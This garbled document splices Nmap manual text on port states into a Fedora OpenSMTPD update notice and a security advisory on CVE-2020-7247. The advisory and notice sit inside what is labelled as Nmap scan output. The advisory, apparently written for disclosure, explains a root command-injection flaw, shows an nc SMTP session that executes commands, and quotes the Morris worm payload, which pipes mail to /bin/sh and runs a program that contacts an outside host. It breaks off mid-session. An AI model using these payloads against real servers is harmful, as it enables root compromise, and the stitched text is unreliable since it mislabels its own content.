`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Fedora Update Notification
FEDORA-2020-b92d7083ca
2020-03-16 20:26:14.974158
--------------------------------------------------------------------------------

Name : opensmtpd
Product : Fedora 32
Version : 6.6.4p1
Release : 2.fc32
URL : <http://www.opensmtpd.org/>
Summary : Free implementation of the server-side SMTP protocol as defined by RFC 5321
Description :
OpenSMTPD is a FREE implementation of the server-side SMTP protocol as defined
by RFC 5321, with some additional standard extensions. It allows ordinary
machines to exchange e-mails with other systems speaking the SMTP protocol.
Started out of dissatisfaction with other implementations, OpenSMTPD nowadays
is a fairly complete SMTP implementation. OpenSMTPD is primarily developed
by Gilles Chehade, Eric Faurot and Charles Longeau; with contributions from
various OpenBSD hackers. OpenSMTPD is part of the OpenBSD Project.
The software is freely usable and re-usable by everyone under an ISC license.

This package uses standard "alternatives" mechanism, you may call
"/usr/sbin/alternatives --set mta /usr/sbin/sendmail.opensmtpd"
if you want to switch to OpenSMTPD MTA immediately after install, and
"/usr/sbin/alternatives --set mta /usr/sbin/sendmail.sendmail" to revert
back to Sendmail as a default mail daemon.

--------------------------------------------------------------------------------
Update Information:

Release 6.6.4p1 (2020-02-24) --- - An out of bounds read in smtpd allows an
attacker to inject arbitrary commands into the envelope file which are then
executed as root. Separately, missing privilege revocation in smtpctl allows
arbitrary commands to be run with the \_smtpq group. Release 6.6.3p1
(2020-02-10) --- - Following the 6.6.2p1 release, various improvements were
done in OpenBSD -current to mitigate the risk of similar bugs.

LPE and RCE in OpenSMTPD (CVE-2020-7247)

==============================================================================
Summary
==============================================================================

We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
vulnerability is exploitable since May 2018 (commit a8e222352f, "switch
smtpd to new grammar") and allows an attacker to execute arbitrary shell
commands, as root:

- either locally, in OpenSMTPD's default configuration (which listens on
  the loopback interface and only accepts mail from localhost);

- or locally and remotely, in OpenSMTPD's "uncommented" default
  configuration (which listens on all interfaces and accepts external
  mail).

We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release) and Debian testing (Bullseye);
other versions and distributions may be exploitable.

==============================================================================
Analysis
==============================================================================

OpenSMTPD's smtp_mailaddr() function is responsible for validating
sender (MAIL FROM) and recipient (RCPT TO) mail addresses:

------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191     const char *domain)
2192 {
....
2218         if (!valid_localpart(maddr->user) ||
2219             !valid_domainpart(maddr->domain)) {
....
2234                 return (0);
2235         }
2236
2237         return (1);
2238 }
------------------------------------------------------------------------------

- it calls valid_domainpart() to validate the domain name (after the @
  sign) of a mail address -- this function only accepts IPv4 and IPv6
  addresses, and alpha-numeric, '.', '-', and '_' characters;

- it calls valid_localpart() to validate the local part (before the @
  sign) of a mail address -- this function only accepts alpha-numeric,
  '.', and MAILADDR_ALLOWED characters (a white list from RFC 5322):

  71 #define MAILADDR_ALLOWED        "!#$%&'*/?^`{|}~+-=_"

Among the characters in MAILADDR_ALLOWED, the ones that are also in
MAILADDR_ESCAPE are later transformed into ':' characters (escaped) by
mda_expand_token():

  72 #define MAILADDR_ESCAPE         "!#$%&'*?`{|}~"

smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping are
fundamental to OpenSMTPD's security -- they prevent dangerous characters
from reaching the shell that executes MDA commands (in mda_unpriv()):

        execle("/bin/sh", "/bin/sh", "-c", mda_command, (char *)NULL,
            mda_environ);

Mail Delivery Agents (MDAs) are responsible for delivering mail to local
recipients; for example, OpenSMTPD's default MDA method is "mbox", and
the corresponding MDA command is (in parse.y):

        asprintf(&dispatcher->u.local.command,
            "/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}");

where %{user.username} is the name of an existing local user (the local
part of the recipient address), and %{mbox.from} is the sender address
(which would be under the complete control of an attacker if it were not
for smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping).

Unfortunately, we discovered a vulnerability in smtp_mailaddr()
(CVE-2020-7247):

------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191     const char *domain)
2192 {
....
2218         if (!valid_localpart(maddr->user) ||
2219             !valid_domainpart(maddr->domain)) {
....
2229                 if (maddr->domain[0] == '\0') {
2230                         (void)strlcpy(maddr->domain, domain,
2231                             sizeof(maddr->domain));
2232                         return (1);
2233                 }
2234                 return (0);
2235         }
2236
2237         return (1);
2238 }
------------------------------------------------------------------------------

If the local part of an address is invalid (line 2218) and if its domain
name is empty (line 2229), then smtp_mailaddr() adds the default domain
automatically (line 2230) and returns 1 (line 2232), although it should
return 0 because the local part of the address is invalid (for example,
because it contains invalid characters).

As a result, an attacker can pass dangerous characters that are not in
MAILADDR_ALLOWED and not in MAILADDR_ESCAPE (';' and ' ' in particular)
to the shell that executes the MDA command. For example, the following
local SMTP session executes "sleep 66" as root, in OpenSMTPD's default
configuration:

------------------------------------------------------------------------------
$ nc 127.0.0.1 25
220 obsd66.example.org ESMTP OpenSMTPD
HELO professor.falken
250 obsd66.example.org Hello professor.falken [127.0.0.1], pleased to meet you

250 2.0.0 Ok
RCPT TO:<root>
250 2.1.5 Destination address valid: Recipient ok
DATA
354 Enter mail, end with "." on a line by itself

How about a nice game of chess?

221 2.0.0 Bye
------------------------------------------------------------------------------

==============================================================================
Exploitation
==============================================================================

Nevertheless, our ability to execute arbitrary shell commands through
the local part of the sender address is rather limited:

- although OpenSMTPD is less restrictive than RFC 5321, the maximum
  length of a local part should be 64 characters;

- the characters in MAILADDR_ESCAPE (for example, '$' and '|') are
  transformed into ':' characters.

To overcome these limitations, we drew inspiration from the Morris worm
(<https://spaf.cerias.purdue.edu/tech-reps/823.pdf>), which exploited the
DEBUG vulnerability in Sendmail by executing the body of a mail as a
shell script:

------------------------------------------------------------------------------
debug
mail from: </dev/null>
rcpt to: <"|sed -e '1,/^$/'d | /bin/sh ; exit 0">
data

cd /usr/tmp
cat > x14481910.c <<'EOF'
[text of vector program]
EOF
cc -o x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440;
rm -f x14481910 x14481910.c

.
quit
------------------------------------------------------------------------------

Indeed, the standard input of an MDA command is the mail itself: "sed"
removes the headers (which were added automatically by the mail server)
and "/bin/sh" executes the body.

We cannot simply reuse this command (because we cannot use the '|' and
'>' characters), but we can use "read" to remove N header lines (where N
is greater than the number of header lines added by the mail server) and
prepend a "NOP slide" of N comment lines to the body of our mail. For
example, the following remote SMTP session executes the body of our
mail, as root, in OpenSMTPD's "uncommented" default configuration:

------------------------------------------------------------------------------
$ nc 192.168.56.143 25
220 obsd66.example.org ESMTP OpenSMTPD
